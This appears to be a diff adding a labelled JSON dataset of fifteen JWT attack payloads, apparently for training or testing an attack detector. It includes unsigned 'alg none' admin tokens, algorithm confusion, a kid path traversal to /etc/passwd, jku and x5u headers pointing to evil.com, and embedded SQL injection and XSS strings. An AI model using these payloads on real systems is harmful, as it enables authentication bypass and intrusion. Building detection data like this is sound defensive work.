@@ -1,0 +1,137 @@
+[
+  {
+    "id": "jwt_alg_none_basic",
+    "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "alg",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_alg_none_v2",
+    "payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "alg",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_weak_signature",
+    "payload": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.weak",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "weak",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_none_json_body",
+    "payload": "{\"alg\":\"none\",\"typ\":\"JWT\"}.eyJhZG1pbiI6dHJ1ZX0.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "none",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_alg_confusion",
+    "payload": "eyJhbGciOiJSUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.public_key",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "alg",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_no_sig_2",
+    "payload": "eyJhbGciOiJub25lIn0.eyJpc19hZG1pbiI6dHJ1ZQ.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "no",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_sensitive_payload",
+    "payload": "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4iLCJzY29wZSI6ImZ1bGxfYWNjZXNzIn0.sig",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "sensitive",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_empty_payload",
+    "payload": "eyJhbGciOiJub25lIn0.e30.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "empty",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_sqli_payload",
+    "payload": "eyJhbGciOiJub25lIn0.eyJpZCI6IicgT1IgMT0xLS0ifQ.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "sqli",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_xss_payload",
+    "payload": "eyJhbGciOiJub25lIn0.eyJuYW1lIjoiPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiJ9.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "xss",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_expiry_bypass",
+    "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJleHAiOjk5OTk5OTk5OTl9.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "expiry",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_kid_traversal",
+    "payload": "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJ1c2VyIjoiYWRtaW4ifQ.sig",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "kid",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_jku_spoof",
+    "payload": "{\"jku\":\"http://evil.com/jwk.json\",\"kid\":\"1\",\"alg\":\"HS256\"}.eyJ1c2VyIjoiYWRtaW4ifQ.sig",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "jku",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_x5u_spoof",
+    "payload": "{\"x5u\":\"http://evil.com/cert.pem\",\"alg\":\"RS256\"}.eyJ1c2VyIjoiYWRtaW4ifQ.sig",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "x5u",
+    "param_location": "cookie",
+    "source": "augmented"
+  },
+  {
+    "id": "jwt_missing_alg",
+    "payload": "eyJ0eXAiOiJKV1QifQ.eyJhZG1pbiI6dHJ1ZX0.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "missing",
+    "param_location": "cookie",
+    "source": "augmented"
+  }
+]
